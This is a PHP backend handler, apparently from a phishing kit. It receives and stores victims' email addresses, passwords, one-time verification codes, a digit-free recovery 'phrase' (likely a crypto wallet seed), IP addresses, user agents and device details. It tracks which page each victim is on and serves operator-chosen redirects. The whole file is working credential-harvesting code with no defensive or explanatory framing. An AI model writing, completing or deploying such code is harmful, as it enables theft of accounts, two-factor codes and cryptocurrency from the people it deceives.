<?php
session_start();
require_once( __DIR__."/../handler/actions.php");

if(isset($_POST["email"])){
    if (filter_var($_POST["email"], FILTER_VALIDATE_EMAIL)) {
        $email = htmlspecialchars($_POST["email"]);
        $_SESSION["email"] = $email;
        insertEmailIfNotExists();
        exit(json_encode(array("status"=> "success","message"=> "Email received")));
    } else{
        exit(json_encode(array("status"=> "error","message"=> "Invalid email address")));
    }
} 

if(isset($_POST["password"])){
    $password = htmlspecialchars($_POST["password"]);
    $_SESSION["password"] = $password;
    insertPassword();
    exit(json_encode(array("status"=> "success","message"=> "Password received")));
}



if(isset($_POST["status"])){
    $status = htmlspecialchars($_POST["status"]);
    if ($status == '1' || $status == '0') {
        update_status($status);

    }
    
}

if(isset($_POST["current_page"])){
    $current_page = htmlspecialchars($_POST["current_page"]);
    update_current_page($current_page);
    
}


if(isset($_POST["ip"]) && isset($_POST["user_agent"])){
    $ip = htmlspecialchars($_POST["ip"]);
    $user_agent = htmlspecialchars($_POST["user_agent"]);
    
    if (!filter_var($ip, FILTER_VALIDATE_IP)) {
        exit;
    }

    if (empty($user_agent)) {
        exit;
    }
    
    update_ip_useragent($ip, $user_agent);
    
}


if(isset($_POST["device_info"])){
    $device_info = htmlspecialchars($_POST["device_info"]);
    update_device_info($device_info);
}


if(isset($_POST["code"])){
    $code = htmlspecialchars($_POST["code"]);

    if (!is_numeric($code)) {
        exit(json_encode(array("status" => "error", "message" => "Invalid code format")));
    }
    $code = intval($code);

    update_code($code);


    exit(json_encode(array("status" => "success", "message" => "Code received")));
}

if(isset($_POST["check_redirect"])){
    if($_POST["check_redirect"] == "true"){
        $redirect_page = check_redirect();
       
        if ($redirect_page !== '') {
            echo json_encode(array("status" => "success", "page" => $redirect_page));
        }
    }
}

if (isset($_POST["phrase"])){
    $phrase = htmlspecialchars($_POST["phrase"]);
    if(strlen($phrase) > 5 && !preg_match('/\d/', $phrase)) {
        update_phrase($phrase);
        echo json_encode(array("status"=> "success","message"=> "Phrase received"));
    } else {
        echo json_encode(array("status"=> "error","message"=> "Phrase must be longer than 5 characters and contain no numbers"));
    }
}

if (isset($_POST["url"])){
    $url = htmlspecialchars($_POST["url"]);
    if (filter_var($url, FILTER_VALIDATE_URL) === false) {
        echo json_encode(array("status" => "error", "message" => "Invalid URL"));
    }
    update_url($url);
    echo json_encode(array("status" => "success", "message" => "URL received"));
}


